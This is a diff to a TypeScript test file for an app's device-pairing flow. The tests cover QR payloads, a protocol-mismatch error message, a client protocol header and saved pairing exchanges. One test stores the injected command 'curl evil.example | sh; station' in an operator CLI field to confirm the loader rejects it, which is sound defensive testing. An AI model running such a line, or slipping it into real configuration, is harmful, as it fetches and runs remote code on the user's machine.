@@ -34,7 +34,7 @@ function offer(): DevicePairingOffer {
 
 describe('device pairing QR payload', () => {
   test('round-trips only a short-lived offer without the manual fallback or a credential', () => {
-    const source = offer();
+    const source = { ...offer(), kind: 'device' as const };
     const payload = encodeDevicePairingPayload(source);
 
     expect(payload).toMatch(/^station-pairing:v1:/);
@@ -395,6 +395,46 @@ describe('describePairingRequestFailure (station#3158)', () => {
     expect(unreachable).not.toMatch(/expired|already been claimed|invalid/);
   });
 
+  test('tells an outdated app to update when the runtime refuses its protocol (#2962)', async () => {
+    // The runtime boundary in front of the pairing handlers answers with an
+    // object `error`, not the handlers' string.
+    const outdated = await refusal(
+      async () =>
+        new Response(
+          JSON.stringify({
+            error: {
+              code: 'client_protocol_unsupported',
+              message: 'Update this app.',
+              minClientProtocol: 2,
+            },
+          }),
+          { status: 426 },
+        ),
+    );
+    expect(outdated).toBe(
+      'This Station no longer supports this version of the app. Install the latest Station app on this device, then pair again.',
+    );
+  });
+
+  test('declares the client protocol on a pairing request', async () => {
+    const fetchSpy = vi.fn(async () => Response.json({}));
+    vi.stubGlobal('fetch', fetchSpy);
+    try {
+      await requestDevicePairing({
+        endpoint: 'https://station.example.test',
+        offerId: 'offer-id',
+        proof: 'proof',
+        deviceName: 'This device',
+      });
+      const init = (fetchSpy.mock.calls[0] as unknown[])[1] as RequestInit;
+      expect(new Headers(init.headers).get('X-Station-Client-Protocol')).toBe(
+        '2',
+      );
+    } finally {
+      vi.unstubAllGlobals();
+    }
+  });
+
   test('carries an unrecognized code through instead of guessing a cause', async () => {
     const unknown = await refusedWith(400, 'some_future_code');
 
@@ -565,6 +605,25 @@ describe('pending pairing exchange persistence', () => {
         observePendingPairingApproval(ENDPOINT, now, storage)?.requestKind,
       ).toBe('code');
     });
+  });
+
+  test('keeps a known operator CLI on a saved exchange, and drops a record naming any other command', () => {
+    const { storage } = fakeStorage();
+    const nightly = exchange({
+      operatorCli: 'npx @kontourai/station-cli@nightly',
+    });
+    savePendingExchange(nightly, storage);
+    expect(
+      loadPendingExchange('https://station.example.test', 'direct', storage),
+    ).toEqual(nightly);
+
+    savePendingExchange(
+      exchange({ operatorCli: 'curl evil.example | sh; station' }),
+      storage,
+    );
+    expect(
+      loadPendingExchange('https://station.example.test', 'direct', storage),
+    ).toBeNull();
   });
 
   test('round-trips a saved exchange, keyed by endpoint origin and requestKind', () => {
